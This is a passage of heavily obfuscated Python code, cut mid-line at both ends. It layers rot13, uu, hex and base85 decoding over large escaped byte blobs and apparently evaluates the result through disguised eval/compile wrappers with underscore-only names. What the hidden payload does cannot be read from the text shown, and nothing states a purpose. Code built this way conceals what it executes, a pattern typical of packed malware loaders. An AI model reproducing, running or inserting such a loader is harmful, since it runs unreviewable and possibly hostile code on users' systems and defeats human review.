_____(_______(\"\\x5f\\137\\x5f\\x5f\\x2e\\144\\145\\x63\\x6f\\144\\145\\x28\\x5f\\137\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\133\\x3a\\x2d\\x54\\162\\165\\x65\\x5d,'\\x72\\x6f\\164\\61\\63')\",\"\",_____.__name__))\n    else:\n        if(_____________[-True]==_____(_______(\"b'\\146\\x35\\x73\\x66\\x73\\144\\146\\141\\165\\x66\\x38\\65'[-True*4]\",\"\", _____.__name__))):\n            _____________=_____(_______(\"\\x5f\\137\\137\\137\\56\\x64\\x65\\143\\157\\144\\145\\50\\x5f\\137\\x5f\\137\\137\\137\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\133\\72\\55\\x54\\162\\165\\145\\x5d,'\\165\\x75')\",\"\",_____.__name__))\n        elif (_____________[-True] ==_____(_______(\"b'\\144\\65\\x73\\x66\\163\\x31\\144\\146\\146\\x68\\163\\144\\x38'[-True*4]\",\"\", _____.__name__))):_____________=_____(_______(\"\\x5f\\x5f\\137\\137\\x2e\\x64\\145\\143\\157\\x64\\145\\50\\x5f\\137\\x5f\\137\\x5f\\137\\137\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\x5b\\72\\x2d\\x54\\162\\x75\\x65\\135,'\\x68\\145\\x78')\",\"\",_____.__name__))\n        else:_____________=_____(_______(\"\\137\\137\\137\\137\\137\\x5f\\56\\142\\70\\65\\144\\145\\143\\x6f\\x64\\145\\50\\x5f\\137\\137\\137\\x5f\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\137\\x5f\\x5b\\72\\x2d\\x54\\x72\\165\\145\\x5d\\51\",\"\",_____.__name__));_____________=_____(_______(\"\\137\\x5f\\137\\137\\56\\144\\145\\x63\\157\\144\\x65\\x28\\x5f\\x5f\\x5f\\137\\137\\x5f\\x5f\\x5f\\137\\137\\137\\137\\137, '\\x68\\x65\\x78')\",\"\",_____.__name__))\n        _____________=_____(_______(\"\\137\\137\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\137\\x2e\\x64\\145\\143\\157\\x64\\145\\50\\x5f\\x5f\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\137\\x29\",\"\",_____.__name__))\n    return _____________\n_________________=_____(_______(\"\\x5f\\137\\137\\x5f\\x5f\\x5f\\137\\x5f\\137\\x5f\\x5f\\56\\x64\\145\\x63\\157\\144\\x65(b'\\\\107\\\\53\\\\x7b\\\\111\\\\x7c\\\\110\\\\x65\\\\51\\\\x6e\\\\67\\\\x48\\\\x38\\\\115\\\\x30\\\\x63\\\\107\\\\x26\\\\x4d\\\\x34\\\\62\\\\x47\\\\55\\\\x4e\\\\x6b\\\\x6e\\\\x47\\\\46\\\\167\\\\x65\\\\66\\\\107\\\\x2d\\\\65\\\\123\\\\61\\\\x48\\\\70\\\\156\\\\122\\\\x68\\\\x48\\\\70\\\\x77\\\\126\\\\x33\\\\x48\\\\x61\\\\x39\\\\153\\\\x38\\\\x47\\\\x2d\\\\x45\\\\142\\\\154\\\\x48\\\\71\\\\x30\\\\144\\\\144\\\\x47\\\\x2d\\\\x4e\\\\x58\\\\173\\\\110\\\\70\\\\156\\\\x46\\\\x61\\\\x47\\\\55\\\\x66\\\\167\\\\160\\\\x48\\\\x21\\\\167\\\\x43\\\\x63\\\\110\\\\70\\\\115\\\\x39\\\\x6a\\\\107\\\\x26\\\\126\\\\114\\\\145\\\\110\\\\70\\\\77\\\\144\\\\x68\\\\107\\\\55\\\\x4e\\\\x6b\\\\65\\\\x48\\\\70\\\\126\\\\x39\\\\x65\\\\x47\\\\x64\\\\126\\\\117\\\\x66\\\\110\\\\x38\\\\50\\\\x55\\\\x66\\\\x48\\\\x44\\\\x4e\\\\x59\\\\60\\\\x47\\\\x2b\\\\x7b\\\\x4d\\\\x31\\\\110\\\\141\\\\x39\\\\x6d\\\\x6a\\\\110\\\\70\\\\167\\\\x4f\\\\147\\\\x48\\\\x39\\\\60\\\\x64\\\\153\\\\107\\\\x2d\\\\116\\\\x68\\\\x6f\\\\110\\\\145\\\\x78\\\\x68\\\\154\\\\110\\\\70\\\\x65\\\\106\\\\x66\\\\x47\\\\x64\\\\115\\\\122\\\\x65\\\\110\\\\x38\\\\156\\\\x49\\\\x66\\\\110\\\\x44\\\\116\\\\x56\\\\65\\\\107\\\\55\\\\x4e\\\\145\\\\x33\\\\x47\\\\46\\\\115\\\\106\\\\x69\\\\110\\\\x38\\\\104\\\\x31\\\\x30\\\\x48\\\\x65\\\\x78\\\\x65\\\\61\\\\x47\\\\55\\\\116\\\\142\\\\62\\\\x48\\\\x23\\\\141\\\\x6a\\\\x64\\\\107\\\\x2d\\\\x57\\\\156\\\\x70\\\\x48\\\\x44\\\\116\\\\123\\\\x6a\\\\110\\\\x38\\\\77\\\\150\\\\66\\\\x48\\\\146\\\\x41\\\\x3f\\\\x37\\\\x48\\\\70\\\\156\\\\122\\\\155\\\\110\\\\43\\\\x6a\\\\x73\\\\x6d\\\\x47\\\\x2d\\\\65\\\\x4f\\\\x7e\\\\x48\\\\x39\\\\x30\\\\144\\\\x6c\\\\x48\\\\x38\\\\156\\\\x50\\\\62\\\\x48\\\\141\\\\71\\\\141\\\\151\\\\x48\\\\70\\\\x43\\\\x3f\\\\127\\\\110\\\\132\\\\x28\\\\115\\\\61\\\\110\\\\x38\\\\126\\\\66\\\\x62\\\\110\\\\132\\\\x28\\\\x4f\\\\x64\\\\110\\\\70\\\\103\\\\x3f\\\\x56\\\\x48\\\\x38\\\\104\\\\x30\\\\147\\\\x47\\\\55\\\\x66\\\\x6e\\\\x33\\\\110\\\\x39\\\\60\\\\160\\\\x68\\\\110\\\\x38\\\\x43\\\\x3f\\\\x56\\\\107\\\\143\\\\x68\\\\x28\\\\x61\\\\107\\\\x2d\\\\116\\\\x58\\\\x7b\\\\x48\\\\x5a\\\\50\\\\x52\\\\150\\\\x48\\\\70\\\\145\\\\x4d\\\\x32\\\\107\\\\144\\\\x56\\\\117\\\\x6b\\\\107\\\\x2d\\\\146\\\\164\\\\x70\\\\107\\\\x64\\\\115\\\\104\\\\x30\\\\110\\\\x38\\\\77\\\\150\\\\x35\\\\107\\\\46\\\\x56\\\\107\\\\61\\\\107\\\\53\\\\x7b\\\\123\\\\66\\\\110\\\\x38\\\\103\\\\x3f\\\\x64\\\\x48\\\\x38\\\\115\\\\x33\\\\132\\\\x48\\\\41\\\\167\\\\67\\\\61\\\\x48\\\\x38\\\\x56\\\\104\\\\x32\\\\110\\\\70\\\\x6e\\\\x52\\\\147\\\\110\\\\x38\\\\x56\\\\63\\\\x59\\\\110\\\\145\\\\170\\\\x71\\\\x32\\\\110\\\\x38\\\\x43\\\\x5f\\\\x62\\\\x47\\\\143\\\\55\\\\63\\\\x67\\\\107\\\\x2d\\\\105\\\\x52\\\\x60\\\\110\\\\43\\\\152\\\\x76\\\\151\\\\x47\\\\46\\\\167\\\\x65\\\\x35\\\\x47\\\\x26\\\\x4d\\\\112\\\\62\\\\x48\\\\x38\\\\x65\\\\114\\\\x6c\\\\x47\\\\x2d\\\\x57\\\\x6b\\\\155\\\\107\\\\x2d\\\\x45\\\\142\\\\154\\\\x47\\\\144\\\\x56\\\\x4f\\\\152\\\\x47\\\\53\\\\173\\\\x4d\\\\60\\\\110\\\\x23\\\\x61\\\\x6a\\\\x69\\\\107\\\\53\\\\x7b\\\\x4c\\\\175\\\\x47\\\\x2d\\\\x57\\\\x68\\\\x36\\\\107\\\\55\\\\x66\\\\x77\\\\x70\\\\x47\\\\x2d\\\\127\\\\x6b\\\\70\\\\x47\\\\x2d\\\\x35\\\\126\\\\x6b\\\\110\\\\x61\\\\x39\\\\155\\\\x70\\\\x47\\\\55\\\\x66\\\\161\\\\66\\\\110\\\\43\\\\x39\\\\x61\\\\x69\\\\x48\\\\70\\\\145\\\\x4a\\\\62\\\\x47\\\\x63\\\\150\\\\172\\\\x5a\\\\110\\\\x38\\\\x65\\\\x4a\\\\x33\\\\110\\\\132\\\\x77\\\\117\\\\145\\\\x47\\\\x2d\\\\105\\\\131\\\\x32\\\\x47\\\\46\\\\x77\\\\x67\\\\x68\\\\107\\\\x2d\\\\65\\\\126\\\\66\\\\x48\\\\146\\\\101\\\\172\\\\156\\\\110\\\\70\\\\x65\\\\103\\\\x63\\\\107\\\\x25\\\\53\\\\50\\\\126\\\\110\\\\x38\\\\x44\\\\x30\\\\x68\\\\x48\\\\x23\\\\x6a\\\\164\\\\x35\\\\110\\\\x38\\\\x33\\\\74\\\\x5a\\\\x47\\\\143\\\\x2b\\\\77\\\\146\\\\107\\\\55\\\\x35\\\\x59\\\\x6c\\\\107\\\\143\\\\150\\\\x24\\\\x64\\\\107\\\\46\\\\64\\\\64\\\\60\\\\x47\\\\143\\\\150\\\\172\\\\143\\\\x48\\\\70\\\\77\\\\x58\\\\x63\\\\107\\\\x64\\\\115\\\\x52\\\\146\\\\107\\\\53\\\\173\\\\x50\\\\65\\\\110\\\\x38\\\\x4d\\\\x36\\\\x63\\\\x47\\\\x2d\\\\x66\\\\x6e\\\\x32\\\\107\\\\x63\\\\x59\\\\x71\\\\141\\\\110\\\\70\\\\x4d\\\\x41\\\\60\\\\110\\\\x66\\\\x41\\\\44\\\\x31\\\\110\\\\x38\\\\126\\\\71\\\\144\\\\x47\\\\45\\\\53\\\\x3f\\\\x65\\\\110\\\\x38\\\\167\\\\x4c\\\\x61\\\\107\\\\45\\\\x2b\\\\77\\\\175\\\\x48\\\\x38\\\\x33\\\\x3c\\\\132\\\\x48\\\\x23\\\\x39\\\\125\\\\146\\\\x48\\\\70\\\\x4d\\\\67\\\\x30\\\\x47\\\\45\\\\137\\\\77\\\\176\\\\110\\\\70\\\\104\\\\x33\\\\x69\\\\110\\\\x61\\\\71\\\\x6d\\\\x69\\\\110\\\\70\\\\x3f\\\\x61\\\\152\\\\107\\\\x2d\\\\x57\\\\x68\\\\x30\\\\110\\\\x38\\\\77\\\\x64\\\\x69\\\\x48\\\\x38\\\\156\\\\x52\\\\x64\\\\107\\\\55\\\\116\\\\x62\\\\60\\\\110\\\\145\\\\x78\\\\x71\\\\x31\\\\x48\\\\70\\\\50\\\\x52\\\\142\\\\107\\\\55\\\\x57\\\\153\\\\x30\\\\x48\\\\x38\\\\x43\\\\137\\\\143\\\\x48\\\\71\\\\60\\\\x70\\\\160\\\\110\\\\70\\\\126\\\\71\\\\146\\\\x47\\\\46\\\\167\\\\x64\\\\x6f\\\\110\\\\x38\\\\x6e\\\\x50\\\\x33\\\\x48\\\\132\\\\x28\\\\117\\\\142\\\\x48\\\\x38\\\\50\\\\x52\\\\x63\\\\110\\\\x23\\\\60\\\\x4c\\\\150\\\\x47\\\\55\\\\x57\\\\x68\\\\x33\\\\x48\\\\132\\\\x77\\\\115\\\\x32\\\\107\\\\55\\\\x57\\\\x71\\\\x6f\\\\110\\\\145\\\\51\\\\160\\\\176\\\\110\\\\x38\\\\x4d\\\\x30\\\\x62\\\\107\\\\45\\\\x2b\\\\x2b\\\\x7b\\\\x48\\\\70\\\\x65\\\\106\\\\x66\\\\110\\\\x65\\\\170\\\\156\\\\x36\\\\x48\\\\x38\\\\x3f\\\\x61\\\\x67\\\\x48\\\\x23\\\\141\\\\150\\\\63\\\\110\\\\70\\\\x33\\\\77\\\\x62\\\\x48\\\\43\\\\x61\\\\x76\\\\x6b\\\\110\\\\x38\\\\x56\\\\x39\\\\143\\\\x48\\\\70\\\\x44\\\\x33\\\\x67\\\\107\\\\x2d\\\\x66\\\\x6e\\\\x32\\\\x48\\\\145\\\\x29\\\\161\\\\x37\\\\x48\\\\x38\\\\126\\\\71\\\\x63\\\\110\\\\41\\\\167\\\\x36\\\\142\\\\x48\\\\x38\\\\x43\\\\174\\\\142\\\\x48\\\\43\\\\71\\\\x58\\\\152\\\\x48\\\\70\\\\50\\\\142\\\\65\\\\107\\\\46\\\\x56\\\\114\\\\x67\\\\107\\\\x2b\\\\x7b\\\\120\\\\x6c\\\\107\\\\x25\\\\137\\\\x3f\\\\x7b\\\\107\\\\55\\\\x4e\\\\x68\\\\x6d\\\\110\\\\x38\\\\x6e\\\\x44\\\\x33\\\\110\\\\x38\\\\x28\\\\130\\\\x6a\\\\110\\\\71\\\\60\\\\x70\\\\151\\\\x47\\\\x2d\\\\146\\\\x71\\\\65\\\\110\\\\x23\\\\x61\\\\x6a\\\\x6b\\\\x47\\\\55\\\\x57\\\\156\\\\71\\\\x48\\\\x44\\\\116\\\\123\\\\155\\\\107\\\\55\\\\105\\\\x56\\\\x31\\\\110\\\\x5a\\\\167\\\\x4f\\\\143\\\\x48\\\\x38\\\\x4d\\\\60\\\\x62\\\\107\\\\45\\\\53\\\\137\\\\145\\\\x48\\\\70\\\\63\\\\x3c\\\\132\\\\107\\\\143\\\\x59\\\\x7a\\\\x63\\\\107\\\\55\\\\105\\\\125\\\\x7e\\\\x48\\\\71\\\\x30\\\\x64\\\\x68\\\\107\\\\x26\\\\167\\\\x61\\\\x6a\\\\x48\\\\141\\\\x39\\\\x6b\\\\70\\\\x48\\\\x38\\\\x43\\\\x7c\\\\142\\\\110\\\\145\\\\x29\\\\164\\\\x31\\\\x47\\\\55\\\\127\\\\x71\\\\x6f\\\\107\\\\x63\\\\131\\\\x71\\\\x56\\\\x47\\\\x2d\\\\116\\\\150\\\\66\\\\110\\\\x66\\\\101\\\\x24\\\\x39\\\\x47\\\\55\\\\127\\\\x6e\\\\x6e\\\\x48\\\\43\\\\x30\\\\114\\\\143\\\\110\\\\70\\\\x4c\\\\174\\\\x57\\\\x48\\\\132\\\\167\\\\x4d\\\\65\\\\x48\\\\x38\\\\x77\\\\126\\\\63\\\\110\\\\43\\\\x61\\\\164\\\\x41\\\\107\\\\55\\\\127\\\\x6b\\\\65\\\\x48\\\\x61\\\\71\\\\152\\\\x6e\\\\107\\\\x2d\\\\x57\\\\x6b\\\\x33\\\\110\\\\43\\\\x39\\\\130\\\\152\\\\x48\\\\70\\\\x65\\\\106\\\\144\\\\110\\\\x38\\\\156\\\\x4f\\\\x6a\\\\x48\\\\x38\\\\63\\\\x3f\\\\143\\\\x47\\\\x64\\\\x4d\\\\122\\\\147\\\\110\\\\x38\\\\167\\\\x52\\\\x68\\\\x48\\\\43\\\\x6a\\\\x79\\\\x6e\\\\x48\\\\70\\\\77\\\\141\\\\150\\\\110\\\\x5a\\\\x77\\\\x43\\\\x67\\\\x48\\\\70\\\\115\\\\x30\\\\x62\\\\110\\\\x38\\\\115\\\\63\\\\150\\\\107\\\\55\\\\127\\\\x68\\\\x31\\\\110\\\\145\\\\170\\\\x6e\\\\x37\\\\107\\\\x2b\\\\x7b\\\\x49\\\\x7e\\\\x47\\\\144\\\\115\\\\x50\\\\70\\\\x47\\\\55\\\\x57\\\\x6e\\\\71\\\\x48\\\\70\\\\156\\\\x4f\\\\x6a\\\\x47\\\\46\\\\x77\\\\x58\\\\x65\\\\110\\\\146\\\\101\\\\74\\\\101\\\\107\\\\x26\\\\64\\\\64\\\\62\\\\110\\\\70\\\\x77\\\\x58\\\\x6a\\\\x48\\\\x44\\\\116\\\\x52\\\\x7b\\\\110\\\\146\\\\x41\\\\44\\\\x71\\\\x78')\",\"\",_____.__name__));________________ = _____(_______(\"\\x5f\\x5f\\x5f\\137\\x5f\\137\\137\\137\\137\\137\\x5f\\56\\144\\145\\x63\\157\\x64\\145(b'\\\\113\\\\154\\\\104\\\\x68\\\\x5a\\\\x50\\\\x6a\\\\x35\\\\107\\\\x46\\\\x4c\\\\155\\\\104\\\\x49\\\\x78\\\\x76\\\\113\\\\171\\\\123\\\\x41\\\\x5a\\\\154\\\\126\\\\165\\\\x41\\\\x76\\\\x53\\\\104\\\\x47\\\\167\\\\143\\\\110\\\\x41\\\\155\\\\x78\\\\144\\\\x57\\\\x51\\\\x56\\\\62\\\\127\\\\123\\\\x56\\\\x64\\\\x49\\\\155\\\\x5a\\\\141\\\\x59\\\\122\\\\x6a\\\\145\\\\107\\\\120\\\\64\\\\x34\\\\107\\\\x47\\\\115\\\\161\\\\x58\\\\x44\\\\x63\\\\101\\\\106\\\\x79\\\\170\\\\71\\\\x42\\\\110\\\\x39\\\\121\\\\107\\\\61\\\\127\\\\x5a\\\\130\\\\60\\\\x49\\\\x55\\\\132\\\\x6c\\\\x44\\\\146\\\\130\\\\123\\\\x75\\\\x59\\\\113\\\\x52\\\\x4c\\\\x66\\\\131\\\\x76\\\\147\\\\x54\\\\130\\\\106\\\\61\\\\123\\\\132\\\\121\\\\116\\\\170\\\\x47\\\\121\\\\x4f\\\\127\\\\x44\\\\x78\\\\71\\\\x45\\\\111\\\\x77\\\\143\\\\160\\\\102\\\\107\\\\x57\\\\x42\\\\x4b\\\\x52\\\\x79\\\\x4a\\\\104\\\\x79\\\\127\\\\115\\\\126\\\\x48\\\\105\\\\126\\\\x4b\\\\x50\\\\x75\\\\116\\\\x41\\\\x30\\\\x4d\\\\x4a\\\\x5a\\\\121\\\\117\\\\124\\\\x50\\\\170\\\\60\\\\164\\\\132\\\\170\\\\122\\\\x35\\\\102\\\\x49\\\\x45\\\\125\\\\130\\\\154\\\\x53\\\\x4c\\\\110\\\\x48\\\\x63\\\\161\\\\132\\\\x6c\\\\x34\\\\x31\\\\105\\\\x76\\\\x57\\\\124\\\\x47\\\\123\\\\x74\\\\143\\\\101\\\\x50\\\\x4f\\\\106\\\\126\\\\60\\\\146\\\\x38\\\\x42\\\\120\\\\70\\\\x76\\\\x5a\\\\61\\\\127\\\\124\\\\110\\\\x78\\\\x78\\\\154\\\\x4a\\\\x46\\\\115\\\\101\\\\130\\\\107\\\\117\\\\x49\\\\101\\\\107\\\\110\\\\x74\\\\102\\\\x52\\\\127\\\\132\\\\132\\\\x6c\\\\x56\\\\171\\\\x44\\\\x52\\\\143\\\\x45\\\\104\\\\154\\\\104\\\\65\\\\107\\\\60\\\\64\\\\x58\\\\x47\\\\106\\\\x67\\\\x4e\\\\110\\\\122\\\\127\\\\126\\\\112\\\\x78\\\\x30\\\\170\\\\x43\\\\122\\\\x31\\\\121\\\\127\\\\107\\\\x44\\\\61\\\\x5a\\\\123\\\\x48\\\\x6c\\\\x44\\\\x31\\\\x4e\\\\147\\\\x49\\\\x79\\\\142\\\\141\\\\x5a\\\\x50\\\\x56\\\\152\\\\126\\\\x53\\\\x35\\\\125\\\\113\\\\122\\\\x74\\\\155\\\\106\\\\x46\\\\x67\\\\160\\\\x46\\\\171\\\\x4f\\\\x56\\\\x41\\\\106\\\\x62\\\\167\\\\111\\\\x6c\\\\142\\\\53\\\\x58\\\\x51\\\\110\\\\170\\\\x5a\\\\123\\\\143\\\\x48\\\\102\\\\121\\\\123\\\\x4b\\\\x57\\\\167\\\\171\\\\127\\\\x57\\\\x76\\\\x39\\\\104\\\\x49\\\\x4e\\\\x63\\\\101\\\\104\\\\x6c\\\\x52\\\\x7a\\\\x5a\\\\123\\\\117\\\\x70\\\\112\\\\x30\\\\64\\\\x79\\\\x41\\\\122\\\\x57\\\\x52\\\\101\\\\170\\\\142\\\\x75\\\\113\\\\x50\\\\170\\\\x64\\\\x4b\\\\x78\\\\105\\\\x55\\\\x58\\\\x50\\\\126\\\\53\\\\x57\\\\111\\\\126\\\\154\\\\112\\\\x53\\\\x74\\\\71\\\\x45\\\\167\\\\71\\\\105\\\\x49\\\\x52\\\\x66\\\\142\\\\107\\\\110\\\\71\\\\x57\\\\x57\\\\x77\\\\x34\\\\147\\\\x5a\\\\61\\\\x57\\\\x71\\\\x56\\\\155\\\\114\\\\x2f\\\\x57\\\\x48\\\\111\\\\x51\\\\x5a\\\\x31\\\\127\\\\x48\\\\112\\\\111\\\\160\\\\x78\\\\131\\\\x46\\\\70\\\\61\\\\120\\\\x78\\\\60\\\\71\\\\107\\\\x47\\\\61\\\\123\\\\101\\\\123\\\\x70\\\\x76\\\\x49\\\\107\\\\147\\\\x43\\\\x4a\\\\111\\\\105\\\\121\\\\x48\\\\x76\\\\105\\\\x49\\\\x43\\\\x52\\\\101\\\\x50\\\\132\\\\x6d\\\\x31\\\\x49\\\\x46\\\\x31\\\\111\\\\x51\\\\x4a\\\\61\\\\x75\\\\106\\\\x59\\\\x31\\\\x49\\\\163\\\\x57\\\\x6c\\\\110\\\\57\\\\110\\\\167\\\\115\\\\110\\\\101\\\\61\\\\143\\\\x4c\\\\x47\\\\x46\\\\x31\\\\160\\\\x47\\\\111\\\\114\\\\x36\\\\x72')\",\"\",_____.__name__));__________________=_____(_______(\"\\137\\x5f\\x5f\\x5f\\137\\137\\x5f\\137\\137\\x5f\\x5f\\x2e\\x64\\x65\\x63\\x6f\\x64\\x65(b'\\\\65\\\\63\\\\65\\\\x34\\\\x33\\\\x31\\\\x34\\\\x66\\\\x34\\\\x64\\\\x34\\\\x34\\\\64\\\\71\\\\x33\\\\x37\\\\65\\\\64\\\\65\\\\x33\\\\65\\\\65\\\\66\\\\71\\\\x34\\\\144\\\\x36\\\\x61\\\\64\\\\62\\\\64\\\\66\\\\x35\\\\x38\\\\x35\\\\x36\\\\x36\\\\146\\\\x34\\\\142\\\\x35\\\\x34\\\\65\\\\63\\\\x36\\\\x38\\\\66\\\\63\\\\x34\\\\144\\\\x37\\\\x39\\\\66\\\\x33\\\\67\\\\x39\\\\x34\\\\x61\\\\x34\\\\63\\\\64\\\\x32\\\\65\\\\x34\\\\64\\\\x61\\\\66\\\\71\\\\66\\\\x62\\\\67\\\\60\\\\x34\\\\144\\\\x36\\\\71\\\\x35\\\\141\\\\65\\\\60\\\\64\\\\71\\\\65\\\\x36\\\\x35\\\\x31\\\\x37\\\\x32\\\\65\\\\x31\\\\x34\\\\64\\\\64\\\\71\\\\x37\\\\141\\\\x34\\\\x63\\\\65\\\\x34\\\\x36\\\\x33\\\\x37\\\\x35\\\\x34\\\\x63\\\\64\\\\63\\\\67\\\\70\\\\x34\\\\63\\\\x35\\\\62\\\\64\\\\65\\\\x35\\\\61\\\\x36\\\\144\\\\65\\\\70\\\\65\\\\63\\\\65\\\\x61\\\\65\\\\71\\\\x35\\\\67\\\\65\\\\x33\\\\64\\\\144\\\\x37\\\\141\\\\65\\\\60\\\\66\\\\143\\\\x34\\\\x61\\\\x35\\\\x61\\\\64\\\\146\\\\x36\\\\142\\\\65\\\\62\\\\65\\\\x38\\\\64\\\\142\\\\x36\\\\x39\\\\x34\\\\x36\\\\65\\\\x39\\\\64\\\\x39\\\\x36\\\\x39\\\\x37\\\\x30\\\\x35\\\\61\\\\64\\\\143\\\\x34\\\\65\\\\x34\\\\x31\\\\63\\\\65\\\\64\\\\x63\\\\64\\\\65\\\\64\\\\65\\\\66\\\\x66\\\\x35\\\\x36\\\\66\\\\x63\\\\x35\\\\x61\\\\66\\\\x31\\\\65\\\\61\\\\x35\\\\x36\\\\x35\\\\65\\\\x37\\\\61\\\\64\\\\x39\\\\65\\\\61\\\\x37\\\\x30\\\\64\\\\145\\\\65\\\\61\\\\66\\\\141\\\\x36\\\\63\\\\x33\\\\62\\\\64\\\\x66\\\\67\\\\x61\\\\x36\\\\70\\\\x36\\\\x31\\\\x35\\\\65\\\\66\\\\x61\\\\64\\\\141\\\\x35\\\\x36\\\\x35\\\\67\\\\x33\\\\x31\\\\66\\\\x62\\\\63\\\\x36\\\\x34\\\\141\\\\x35\\\\x34\\\\x36\\\\67\\\\x33\\\\x30\\\\x35\\\\67\\\\65\\\\63\\\\x37\\\\x33\\\\x33\\\\x37\\\\x34\\\\x63\\\\x35\\\\66\\\\x36\\\\x34\\\\x36\\\\62\\\\65\\\\x34\\\\x35\\\\63\\\\64\\\\x36\\\\64\\\\71\\\\x35\\\\61\\\\x35\\\\x33\\\\63\\\\x31\\\\65\\\\62\\\\65\\\\x31\\\\x34\\\\x36\\\\x36\\\\x37\\\\63\\\\x30\\\\65\\\\x33\\\\x35\\\\63\\\\x37\\\\63\\\\66\\\\x37\\\\x34\\\\143\\\\65\\\\x33\\\\64\\\\x39\\\\63\\\\x36\\\\x35\\\\x32\\\\64\\\\66\\\\x34\\\\x65\\\\x34\\\\x61\\\\65\\\\61\\\\x36\\\\143\\\\x37\\\\x34\\\\x34\\\\x39\\\\64\\\\146\\\\65\\\\64\\\\66\\\\143\\\\65\\\\63\\\\x35\\\\x33\\\\64\\\\64\\\\x34\\\\62\\\\x36\\\\x35\\\\x34\\\\x64\\\\x36\\\\x61\\\\x34\\\\141\\\\66\\\\x35\\\\65\\\\x31\\\\x34\\\\66\\\\66\\\\142\\\\x33\\\\x33\\\\x35\\\\x34\\\\64\\\\x34\\\\x34\\\\x64\\\\x33\\\\65\\\\x35\\\\60\\\\64\\\\x36\\\\x36\\\\63\\\\x33\\\\63\\\\x34\\\\63\\\\66\\\\x62\\\\x33\\\\x31\\\\x34\\\\65\\\\64\\\\x63\\\\64\\\\63\\\\63\\\\64\\\\x33\\\\65\\\\65\\\\66\\\\x34\\\\64\\\\63\\\\65\\\\64\\\\63\\\\x35\\\\x37\\\\65\\\\63\\\\66\\\\x33\\\\67\\\\x38\\\\65\\\\x34\\\\64\\\\x35\\\\x34\\\\x36\\\\x35\\\\x61\\\\64\\\\145\\\\x34\\\\x33\\\\x35\\\\61\\\\x36\\\\145\\\\x34\\\\x65\\\\x35\\\\63\\\\x33\\\\x34\\\\x33\\\\x33\\\\x34\\\\x39\\\\67\\\\141\\\\x34\\\\x61\\\\66\\\\x31\\\\65\\\\67\\\\x33\\\\60\\\\65\\\\141\\\\x34\\\\141\\\\65\\\\67\\\\x35\\\\x35\\\\x37\\\\63\\\\63\\\\x36\\\\65\\\\x35\\\\66\\\\143\\\\x36\\\\142\\\\67\\\\66\\\\x35\\\\x35\\\\x35\\\\65\\\\x33\\\\64\\\\66\\\\x66\\\\65\\\\x35\\\\65\\\\63\\\\63\\\\x34\\\\63\\\\65\\\\x35\\\\63\\\\63\\\\x31\\\\x37\\\\63\\\\67\\\\x35\\\\64\\\\141\\\\63\\\\60\\\\63\\\\70\\\\66\\\\71\\\\65\\\\x34\\\\x35\\\\x34\\\\x36\\\\142\\\\67\\\\66\\\\x35\\\\x32\\\\64\\\\66\\\\x35\\\\65\\\\67\\\\70\\\\x34\\\\144\\\\63\\\\x31\\\\x33\\\\x30\\\\x37\\\\71\\\\65\\\\61\\\\65\\\\64\\\\66\\\\63\\\\x36\\\\71\\\\x35\\\\x34\\\\66\\\\x61\\\\x37\\\\67\\\\x33\\\\x32\\\\64\\\\146\\\\x34\\\\64\\\\x37\\\\67\\\\64\\\\x62\\\\x35\\\\64\\\\x35\\\\x35\\\\x36\\\\x63\\\\64\\\\62\\\\65\\\\x37\\\\64\\\\65\\\\x36\\\\67\\\\x37\\\\67\\\\64\\\\x62\\\\65\\\\66\\\\x34\\\\62\\\\x34\\\\70\\\\x35\\\\x38\\\\65\\\\63\\\\65\\\\x35\\\\66\\\\143\\\\x34\\\\x61\\\\63\\\\60\\\\64\\\\x39\\\\x33\\\\x35\\\\64\\\\x63\\\\x34\\\\63\\\\x34\\\\x65\\\\x35\\\\x36\\\\x34\\\\x63\\\\64\\\\x36\\\\x36\\\\x33\\\\66\\\\x39\\\\x35\\\\x37\\\\66\\\\x39\\\\67\\\\x37\\\\x36\\\\x39\\\\65\\\\61\\\\x36\\\\x39\\\\65\\\\x39\\\\x37\\\\64\\\\65\\\\64\\\\x34\\\\x36\\\\67\\\\x33\\\\x36\\\\x61\\\\64\\\\144\\\\63\\\\61\\\\63\\\\x39\\\\64\\\\x61\\\\65\\\\x34\\\\x36\\\\71\\\\x33\\\\x31\\\\65\\\\x61\\\\x35\\\\x34\\\\x37\\\\x61\\\\63\\\\x30\\\\x37\\\\60\\\\x35\\\\x33\\\\66\\\\71\\\\66\\\\x37\\\\x37\\\\x31\\\\x34\\\\x63\\\\66\\\\141\\\\x34\\\\65\\\\x37\\\\61\\\\65\\\\63\\\\64\\\\65\\\\67\\\\x30\\\\x35\\\\71\\\\x35\\\\x30\\\\64\\\\x36\\\\x36\\\\x33\\\\66\\\\x64\\\\65\\\\67\\\\x36\\\\x39\\\\65\\\\x31\\\\x37\\\\x36\\\\x35\\\\70\\\\x35\\\\66\\\\66\\\\x34\\\\x34\\\\x36\\\\x34\\\\x39\\\\64\\\\66\\\\x36\\\\x38\\\\66\\\\61\\\\x34\\\\145\\\\x34\\\\x31\\\\x37\\\\60\\\\64\\\\145\\\\65\\\\62\\\\x36\\\\x62\\\\64\\\\x36\\\\x35\\\\60\\\\x34\\\\142\\\\x35\\\\x33\\\\x36\\\\x37\\\\x36\\\\146\\\\x34\\\\x66\\\\66\\\\x63\\\\67\\\\x33\\\\x33\\\\x34\\\\65\\\\61\\\\66\\\\142\\\\65\\\\x35\\\\63\\\\70\\\\64\\\\x64\\\\x35\\\\65\\\\x35\\\\62\\\\64\\\\x35\\\\x34\\\\143\\\\66\\\\141\\\\x35\\\\x35\\\\x36\\\\x66\\\\x34\\\\146\\\\66\\\\x63\\\\x34\\\\144\\\\x33\\\\x32\\\\65\\\\x31\\\\64\\\\64\\\\x35\\\\61\\\\63\\\\x34\\\\64\\\\145\\\\x35\\\\65\\\\65\\\\x61\\\\x35\\\\71\\\\65\\\\66\\\\64\\\\x33\\\\x33\\\\x30\\\\67\\\\x39\\\\x35\\\\x35\\\\67\\\\141\\\\x35\\\\62\\\\64\\\\x65\\\\x34\\\\143\\\\x34\\\\x34\\\\66\\\\x34\\\\66\\\\x31\\\\65\\\\x37\\\\x36\\\\71\\\\x34\\\\x31\\\\66\\\\x64\\\\x34\\\\x61\\\\67\\\\x61\\\\x36\\\\x37\\\\67\\\\x37\\\\65\\\\66\\\\x36\\\\142\\\\x34\\\\71\\\\66\\\\67\\\